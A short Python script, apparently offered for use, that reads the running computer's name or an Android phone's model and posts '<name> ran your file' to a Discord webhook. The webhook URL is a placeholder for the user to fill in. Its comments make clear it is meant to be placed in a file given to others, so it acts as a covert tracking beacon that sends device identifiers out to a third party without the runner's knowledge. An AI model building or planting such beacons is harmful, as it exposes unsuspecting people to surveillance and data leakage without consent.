import os
import subprocess
from discord_webhook import DiscordWebhook

# Finds the pc name

def get_pc_name():
    try:
        pc_name = os.environ['COMPUTERNAME']  # For Windows
        # pc_name = os.uname().nodename  # For Unix-like systems
        return pc_name
    except Exception as e:
        return None

# Finds the phone name

def get_phone_name():
    try:
        # Execute shell command to get device model
        output = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
        return output
    except Exception as e:
        return None

# Retrieves the info it found and adds ran your file to the end of it

if __name__ == "__main__":
    pc_name = get_pc_name()
    phone_name = get_phone_name()

    if pc_name:
        content = f" {pc_name} ran your file"
    elif phone_name:
        content = f" {phone_name} ran your file"
    else:
        exit()
            
# Sends either the pc name or the phone name to the webhook

    webhook_url = "ENTTER DISCORD WEBHOOK HERE"
    webhook = DiscordWebhook(url=webhook_url, content=content)
    response = webhook.execute()
    print("sent successfully")

# You can remove the  print("sent successfully") i added it just to show nothing failed
